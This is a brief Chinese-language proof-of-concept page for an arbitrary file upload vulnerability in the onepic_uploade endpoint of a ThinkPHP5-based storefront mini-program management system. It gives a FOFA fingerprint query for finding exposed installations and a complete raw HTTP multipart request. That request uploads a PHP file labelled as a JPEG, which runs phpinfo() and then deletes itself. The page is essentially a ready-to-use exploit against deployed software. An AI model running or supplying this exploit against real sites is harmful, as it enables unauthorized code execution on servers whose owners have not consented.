# 万能门店小程序管理系统onepic_uploade任意文件上传漏洞

万能门店小程序DIY建站无限独立版非微擎应用，独立版是基于国内很火的ThinkPHP5框架开发的，适用于各行各业小程序、企业门店小程序，万能门店小程序管理系统onepic_uploade任意文件上传漏洞

## fofa

```javascript
"/comhome/cases/index.html" 
```

## poc

```javascript
POST /comadmin/Remote/onepic_uploade?file=file HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0p5OtH5zz
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryBiKyL9D0p5OtH5zz
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryBiKyL9D0p5OtH5zz--
```

![image-20241128164739396](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411281647503.png)